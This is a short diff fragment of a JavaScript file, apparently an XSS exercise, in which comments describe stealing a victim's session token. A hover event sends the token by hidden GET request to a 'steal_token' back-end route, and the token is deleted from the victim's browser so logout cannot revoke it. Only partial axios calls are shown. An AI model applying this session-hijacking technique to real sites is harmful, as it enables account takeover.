@@ -33,7 +33,7 @@ axios({
 
 //On mouse over the danger item, i send an hide get request with token session as parameter
 //In back-end i add a new routes at url "steal_token" that accepts an http get with token stolen as url param
-//When attack runs, in the terminal of back-end, the token session of victim will be shown
+//When attack runs (victim's mouse is over danger content), in the terminal of back-end, the token session of victim will be shown
 //I also delete token from the victim browser's to avoid that it will be deleted by the victim on logout procedure
 axios({
     method: 'post',
